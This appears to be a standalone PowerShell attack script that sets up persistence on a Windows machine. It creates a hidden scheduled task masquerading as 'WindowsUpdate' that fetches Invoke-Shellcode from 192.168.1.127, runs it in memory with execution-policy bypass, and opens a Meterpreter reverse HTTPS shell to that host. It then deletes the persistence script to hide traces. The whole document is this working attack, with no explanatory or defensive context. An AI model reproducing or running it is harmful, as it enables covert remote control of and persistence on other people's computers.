Invoke-Command -ScriptBlock { schtasks /create  /TN WindowsUpdate /TR "powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.1.127/Invoke-Shellcode'''))'; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force" /SC onidle /i 20} 

Start-Sleep 10 
Remove-Item C:\Temp\persist.ps1
